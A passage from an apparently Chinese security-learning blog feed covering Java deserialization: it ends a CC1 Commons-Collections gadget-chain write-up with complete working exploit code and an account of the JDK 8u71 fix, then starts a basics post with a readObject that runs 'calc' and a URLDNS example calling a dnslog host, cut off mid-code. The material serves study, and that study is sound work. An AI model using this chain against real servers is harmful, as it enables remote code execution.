class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//首先用 LazyMap 替换 TransformedMap</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//对 sun.reflect.annotation.AnnotationInvocationHandler 对象进行 Proxy</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//利用反射创建了一个 AnnotationInvocationHandler 对象；它内部的 memberValues 是 LazyMap</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);<br><br>        <span class="hljs-comment">//创建动态代理对象 proxyMap，当有人对这个 proxyMap 调用 Map 的任意方法，会进入 AnnotationInvocationHandler.invoke(...)</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, handler);<br><br>        <span class="hljs-comment">//因为 proxyMap 自己序列化 /反序列化不会触发链子；只有 AnnotationInvocationHandler 的反序列化过程才会去主动访问 memberValues</span><br>        <span class="hljs-comment">//把 proxyMap 塞进一个新的 AnnotationInvocationHandler 的 memberValues 字段里，让它在 readObject() 时被调用</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, proxyMap);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810087.png"></p><h3 id="2-3-问题"><a href="#2-3-问题" class="headerlink" title="2.3 问题"></a>2.3 问题</h3><ol><li>未执行到 readObject 就弹出计算器</li></ol><blockquote><p>《Java 安全漫谈》</p><p>在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，所</p><p>以，在本地调试代码的时候，因为调试器会在下面调用一些toString之类的方法，导致不经意间触发了</p><p>命令。</p></blockquote><p>解决办法有 ：</p><p>设置 - 构建、执行、部署 - 调试器 - 数据视图 - Java</p><p>关闭：</p><p>启用集合类的替代视图</p><p>启用’toStringO’对象视图</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810304.png"></p><h3 id="2-4-总结"><a href="#2-4-总结" class="headerlink" title="2.4 总结"></a>2.4 总结</h3><p>漏洞原理：</p><ul><li><code>LazyMap.decorate(Map, Transformer)</code> 包装一个底层 Map。</li><li>当调用 <code>get(key)</code> 时，如果 <code>key</code> 不存在，就会调用 <code>transformer.transform(key)</code> 生成值并返回</li></ul><p>利用链：</p><p>AnnotationInvocationHandler.readObject</p><p>AnnotationInvocationHandler.invoke</p><p>memberValues.get</p><p>LazyMap.get</p><p>LazyMap.get.factor.<font style="color:rgb(44, 62, 80);">transform</font></p><p>ChainedTransformer.transform</p><p>ConstantTransformer.transform</p><p>InvokerTransformer.transform  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810272.png"></p><h1 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h1><h2 id="1、TransformedMap"><a href="#1、TransformedMap" class="headerlink" title="1、TransformedMap"></a>1、TransformedMap</h2><p>TransformedMap 在 Java 8u71 以上的版本就不可以使用了。</p><p>首先梳理一下 TransformedMap 利用链的逻辑：</p><p><code>TransformedMap.decorate</code> 包装了一个 <code>Map</code>，并设置了一个恶意 <code>Transformer</code>，<code>TransformedMap</code> 在调用<code>Map.Entry.setValue</code> 的时候，会触发 <code>transformer.transform(value)</code>，在 gadget 链里，利用 <code>AnnotationInvocationHandler</code> 的反序列化逻辑，最终会调用到 <code>Map.Entry.setValue</code>，触发恶意代码。</p><p>而利用 <code>AnnotationInvocationHandler</code> 主要用的是 <code>readObject</code>方法的反序列化操作，</p><ul><li>在  Java 8u71 之前：</li></ul><p><code>readObject</code>方法在反序列化时会遍历 <code>Map</code> 中的 <code>entry</code>，调用 <code>entry.setValue()</code> 来调整键值。于是恶意的 <code>TransformedMap entry</code> 会被调用 <code>setValue</code>，从而执行 <code>transform()</code>。</p><ul><li>在 Java 8u71 之后：</li></ul><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810069.png"></p><p> 新建一个<code>LinkedHashMap</code>，对值的修正，改成了 <code>value = new ...</code>，而不是直接调用<code>entry.setValue</code>，后续的操作都是针对<code>LinkedHashMap</code>。这样一来，<code>streamVals</code>就不会去调用 <code>setValue</code>，它只是作为一个输入被读取了一遍，然后就进入了<code>LinkedHashMap</code>，不会触发恶意方法。</p><p>所以说，漏洞的修复和 <code>setValue</code>关系不大，</p><blockquote><p>《Java 安全漫谈》</p><p>对于这次修改，有些文章说是因为没有了setValue，其实原因和setValue关系不大。改动后，不再直接</p><p>使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。</p><p>所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执</p><p>行set或put操作，也就不会触发RCE了。</p></blockquote><h2 id="2、-LazyMap"><a href="#2、-LazyMap" class="headerlink" title="2、 LazyMap"></a>2、 LazyMap</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810672.png"></p><p>原来 <code>readObject</code> 会通过 <code>memberValues.get(name)</code> 或者 <code>entry.setValue(...)</code> 间接调用 <code>Map</code> 的查找&#x2F;写入方法，现在改为遍历反序列化出来的 <code>streamVals.entrySet()</code>、直接读取 <code>entry.getValue()</code> 并把值复制到一个新的 <code>LinkedHashMap</code>，然后用 <code>Unsafe</code>  直接在内存里把对象字段的引用一次性写入  。这样就切断了触发 LazyMap.transform 的路径。  </p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 反序列化学习</title>
    <link href="/2025/08/26/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/08/26/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-反序列化"><a href="#Java-反序列化" class="headerlink" title="Java 反序列化"></a>Java 反序列化</h1><h1 id="1、序列化与反序列化"><a href="#1、序列化与反序列化" class="headerlink" title="1、序列化与反序列化"></a>1、序列化与反序列化</h1><h2 id="1-1-什么是序列化-反序列化"><a href="#1-1-什么是序列化-反序列化" class="headerlink" title="1.1 什么是序列化&amp;反序列化"></a>1.1 什么是序列化&amp;反序列化</h2><p>序列化：将内存中的对象压缩成字节流<br>反序列化：将字节流转化成内存中的对象</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749235.png"></p><h2 id="1-2-为什么有序列化技术"><a href="#1-2-为什么有序列化技术" class="headerlink" title="1.2 为什么有序列化技术"></a>1.2 为什么有序列化技术</h2><p>序列化与反序列化的设计就是用来传输数据的。</p><p><strong>应用场景</strong><br>(1) 想把内存中的对象保存到一个文件中或者是数据库当中。<br>(2) 用套接字在网络上传输对象。<br>(3) 通过RMI传输对象的时候。</p><h2 id="1-3-几种常见的序列化和反序列化协议"><a href="#1-3-几种常见的序列化和反序列化协议" class="headerlink" title="1.3 几种常见的序列化和反序列化协议"></a>1.3 几种常见的序列化和反序列化协议</h2><ul><li>XML</li><li>SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议</li><li>JSON（Javascript Object Notation）</li><li>Protobuf</li></ul><h2 id="1-4-序列化和反序列化实现"><a href="#1-4-序列化和反序列化实现" class="headerlink" title="1.4 序列化和反序列化实现"></a>1.4 序列化和反序列化实现</h2><p>简单分析 Java 的对象序列化的不同写法：</p><p>俩种写法本质上都是 Java 的对象序列化，但它们在底层的 IO 流使用方式上略有不同：</p><p><strong>写法一：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));<br></code></pre></td></tr></table></figure><p>传统的基于字节流的文件写入方式：FileOutputStream(“ser.bin”)， 创建一个 <code>FileOutputStream</code>，表示要写入的目标文件是 <code>ser.bin</code></p><p>特点：</p><ul><li>简单直接，兼容性很好，Java 早期版本就有。</li><li>对路径和文件名使用的是 <strong>字符串形式</strong>。</li></ul><p><strong>写法二：（IDEA推荐）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));<br></code></pre></td></tr></table></figure><p><code>**Paths.get(&quot;ser.bin&quot;)**</code></p><ul><li>使用 <code>java.nio.file.Path</code> 来表示文件路径，比 <code>String</code> 更灵活、可组合。</li><li>可以方便地处理跨平台路径，比如 <code>&quot;folder/subfolder/file.txt&quot;</code></li></ul><p><code>**Files.newOutputStream(path)**</code></p><ul><li>返回一个 <code>OutputStream</code>，功能类似 <code>FileOutputStream</code>。</li><li>基于 NIO（New IO）库，提供更多文件操作选项，</li></ul><p>特点：</p><ul><li>更现代化的写法，灵活性高，支持 NIO 的各种特性。</li><li>更适合与 <code>Path</code>、<code>Files</code> API 配合，比如检查文件是否存在、创建目录等。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">//定义一个 Person 类，并声明它实现了 Serializable 接口,这样 Person 的对象就可以被序列化</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-comment">//私有成员变量</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-comment">//无参构造</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-comment">//有参构造</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-comment">//重写 toString() 方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Serialization</span> &#123;<br><br>    <span class="hljs-comment">//定义一个静态方法 serialize(Object obj)，接收一个对象并把它序列化到文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// ObjectOutputStream：包装文件输出流，使其支持写对象</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<br>            <span class="hljs-comment">// Files.newOutputStream(...)：创建一个输出流，写入到 ser.bin 文件</span><br>            <span class="hljs-comment">// Paths.get(&quot;ser.bin&quot;)：得到一个路径对象，表示当前项目目录下的 ser.bin 文件</span><br>            Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;ser.bin&quot;</span>))<br>        );<br>        <span class="hljs-comment">//oos.writeObject(obj)：把传入的 obj 写到文件里（前提是对象必须实现 Serializable 接口）</span><br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">11</span>);<br>        System.out.println(person);<br>        <span class="hljs-comment">//把这个 person 对象写入 ser.bin 文件</span><br>        serialize(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unserialize</span> &#123;<br><br>    <span class="hljs-comment">//定义一个静态方法 unserialize，接收序列化后的二进制文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//new ObjectInputStream(...)：包装成对象输入流，这样可以直接读取对象</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<br>            <span class="hljs-comment">// Files.newInputStream(Paths.get(filename))：创建一个输入流，指向 filename 文件</span><br>            Files.newInputStream(Paths.get(filename))<br>        );<br>        <span class="hljs-comment">//ois.readObject()：从文件中读取对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//调用 unserialize(&quot;ser.bin&quot;)，从 ser.bin 文件里反序列化得到一个对象，强制转换为 Person 类型</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">Serialization 创建 Person 对象并将其序列化保存到文件 ser.bin</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749774.png"></p><p>生成的 <font style="color:#080808;background-color:#ffffff;"> ser.bin </font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750280.png"></p><p><font style="color:#080808;background-color:#ffffff;">Unserialize  从 ser.bin 文件里恢复（反序列化）一个对象  </font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750920.png"></p><p><strong>总的来说：</strong></p><p> 在 <code>serialize</code> 方法中，先通过输出流对象 <code>new FileOutputStream(&quot;ser.bin&quot;)</code>【等价于 <code>Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))</code>】创建文件输出通道，然后将输出流包装成 <code>ObjectOutputStream</code>，再调用 <code>writeObject</code> 方法将对象序列化并写入文件。</p><p> 在 <code>unserialize</code> 方法中，先通过输入流对象 <code>new FileInputStream(&quot;ser.bin&quot;)</code>【等价于 <code>Files.newInputStream(Paths.get(&quot;ser.bin&quot;))</code>】创建文件输入通道，然后将输入流包装成 <code>ObjectInputStream</code>，再调用 <code>readObject</code> 方法将文件中的二进制数据读取出来并反序列化成对象。  </p><h2 id="1-5-为什么会产生安全问题？"><a href="#1-5-为什么会产生安全问题？" class="headerlink" title="1.5 为什么会产生安全问题？"></a>1.5 为什么会产生安全问题？</h2><p>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p><ol><li><font style="color:rgb(51, 51, 51);">入口类的</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);&quot;&gt;readObject&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">直接调用危险方法</font></li><li><font style="color:rgb(51, 51, 51);">入口参数中包含可控类，该类有危险方法，readObject 时调用</font></li><li><font style="color:rgb(51, 51, 51);">入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</font></li><li><font style="color:rgb(51, 51, 51);">构造函数&#x2F;静态代码块等类加载时隐式执行</font></li></ol><h3 id="1-5-1-入口类的-readObject-直接调用危险方法"><a href="#1-5-1-入口类的-readObject-直接调用危险方法" class="headerlink" title="1.5.1 入口类的 readObject 直接调用危险方法"></a>1.5.1 入口类的 <code>readObject</code> 直接调用危险方法</h3><p>Person 类中写入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">//调用默认的反序列化过程</span><br>    ois.defaultReadObject();<br>    <span class="hljs-comment">//执行了一个系统命令</span><br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p> 反序列化时 JVM 会先调用 Person 类中自定义的 <code>readObject</code> 方法，而其中加入了命令执行逻辑，因此对象恢复过程中就触发了计算器的运行。  </p><p>依次执行序列化、反序列化，弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311751914.png"></p><h3 id="1-5-2-入口参数中包含可控类，该类有危险方法，readObject-时调用"><a href="#1-5-2-入口参数中包含可控类，该类有危险方法，readObject-时调用" class="headerlink" title="1.5.2 入口参数中包含可控类，该类有危险方法，readObject 时调用"></a>1.5.2 入口参数中包含可控类，该类有危险方法，readObject 时调用</h3><p>为什么HashMap要自己实现writeObject和readObject方法？</p><p><a href="https://juejin.cn/post/6844903954774491144">https://juejin.cn/post/6844903954774491144</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test01</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        HashMap&lt;URL, Integer&gt; hash = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://w9ge5j.dnslog.cn&quot;</span>);<br>        hash.put(u, <span class="hljs-number">1</span>);<br><br>        serializableTest(hash);<br>        unserializableTest(<span class="hljs-string">&quot;dns.txt&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializableTest</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;dns.txt&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-comment">// 反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserializableTest</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span 